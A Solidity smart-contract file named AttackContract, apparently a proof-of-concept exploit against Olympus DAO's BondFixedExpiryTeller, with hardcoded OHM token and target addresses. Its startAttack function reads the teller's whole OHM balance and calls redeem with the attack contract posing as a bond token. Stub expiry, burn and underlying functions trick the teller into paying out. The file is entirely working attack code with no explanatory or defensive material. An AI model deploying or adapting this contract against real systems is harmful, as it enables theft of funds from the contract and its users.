//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;

// ERC20 Interface
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// BondFixedExpiryTeller Interface
interface BondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external;
}

// AttactContract Class
contract AttackContract {
    // Address of OHM Token
    address OHMTokenAddress = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

    // Address of Olympus DAOs BondFixedExpiryTeller contract
    address targetContractAddress = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;

    event AttackStatus(uint256);

    // Entry point for the attack, this will be called by an EOA using JavaScript
    function startAttack(address thisAddress) external {
        ERC20 tokenContract = ERC20(OHMTokenAddress);

        uint256 targetBalance = tokenContract.balanceOf(targetContractAddress);
        emit AttackStatus(targetBalance);

        BondFixedExpiryTeller targetContract = BondFixedExpiryTeller(targetContractAddress);
        targetContract.redeem(thisAddress, targetBalance);
    }

    function expiry() external pure returns (uint48 _expiry) {
        // Return a timestamp anytime before now
        return uint48(0x5);
    }

    function burn(address from, uint256 amount) external pure {
        return;
    }

    function underlying() external view returns (ERC20 _underlying) {
        return ERC20(OHMTokenAddress);
    }
}